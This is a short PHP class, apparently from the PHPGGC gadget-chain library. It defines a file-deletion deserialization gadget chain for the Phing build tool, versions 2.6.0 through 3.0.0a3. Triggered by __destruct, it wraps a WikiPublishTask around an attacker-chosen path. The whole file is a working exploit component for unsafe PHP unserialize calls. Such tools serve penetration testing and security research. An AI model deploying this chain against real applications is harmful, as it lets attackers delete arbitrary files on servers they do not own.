<?php

namespace GadgetChain\Phing;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '2.6.0 <= 3.0.0a3';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        return new \WikiPublishTask($parameters['remote_path']);
    }
}